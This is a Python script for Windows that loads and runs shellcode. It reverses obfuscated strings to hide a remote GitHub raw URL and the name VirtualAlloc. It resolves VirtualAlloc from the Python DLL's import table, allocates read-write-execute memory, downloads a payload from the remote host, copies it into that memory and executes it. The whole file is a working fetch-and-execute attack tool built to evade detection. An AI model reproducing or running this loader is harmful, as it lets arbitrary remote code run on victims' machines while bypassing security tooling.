#6c2a91f23724a8605312bff1d629f92a7a88e78d947e79da5e403338f4eefeb6

import ctypes, sys, os
import requests

try:
    import pefile
except ImportError:
    print("pip install pefile"); sys.exit(1)

SCODE_U = "onyd.ger/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
SCODE_U = SCODE_U[::-1]

def dwnlod_scode(url):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        shel_ly = b''.join(response.iter_content(chunk_size=4096))
        print(f"[+] Downloaded {len(shel_ly)} bytes")
        return shel_ly
    except Exception as e:
        print(f"[-] Download failed: {e}"); return None

def copy_to_page(page: int, scode: bytes) -> bool:
    """Copy scode bytes into the RWX page via ctypes.memmove."""
    if not page:
        print("[-] Invalid page address"); return False
    if len(scode) > 0x1000:
        print(f"[-] Scode too large ({len(scode)} > 0x1000)"); return False

    # memmove(dst, src, count)
    # dst = raw integer address of our RWX page
    # src = scode bytes (ctypes accepts bytes directly as src)
    ctypes.memmove(page, scode, len(scode))
    print(f"[+] Copied {len(scode)} bytes → 0x{page:016x}")
    return True

def exec_page(page: int):
    """Cast the page to a void(*)(void) and call it."""
    thunk = ctypes.WINFUNCTYPE(None)(page)
    print(f"[+] Executing scode @ 0x{page:016x}")
    thunk()

ver      = sys.version_info
dll_name = f"python{ver.major}{ver.minor}.dll"
dll_path = os.path.join(os.path.dirname(sys.executable), dll_name)

k32 = ctypes.windll.kernel32
k32.GetModuleHandleW.restype  = ctypes.c_void_p     
k32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
base = k32.GetModuleHandleW(dll_name)
print(f"[*] {dll_name} @ 0x{base:016x}")

pe = pefile.PE(dll_path, fast_load=False)
pe.parse_data_directories()

memprep=b"collAlautriV"
va_va = 0
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    if b'kernel32' in entry.dll.lower():
        for imp in entry.imports:
            if imp.name == memprep[::-1]:
                slot  = base + imp.address - pe.OPTIONAL_HEADER.ImageBase
                va_va = ctypes.c_uint64.from_address(slot).value
                break

if not va_va:
    print("[-] collAlautriV not found in IAT"); sys.exit(1)
print(f"[+] collAlautriV @ 0x{va_va:016x}")

MemoryAllocator = ctypes.WINFUNCTYPE(
    ctypes.c_void_p,
    ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_uint32, ctypes.c_uint32
)(va_va)

page = MemoryAllocator(None, 0x1000, 0x3000, 0x40)
print(f"[+] RWX page @ 0x{page:016x}" if page else f"[-] failed (GLE={k32.GetLastError()})")

if page:
    print("[+] allocated!")

# ── execution ─────────────────────────────────────────────────────────────────────
scode = dwnlod_scode(SCODE_U)
if scode:
    # page = your VAlloc result from earlier
    if copy_to_page(page, scode):
        exec_page(page)
        
    # ── cleanup (only reached if shellcode returns) ───────────────────────────────
    k32.VirtualFree(ctypes.c_void_p(page), 0, 0x8000)
    print("[*] freed")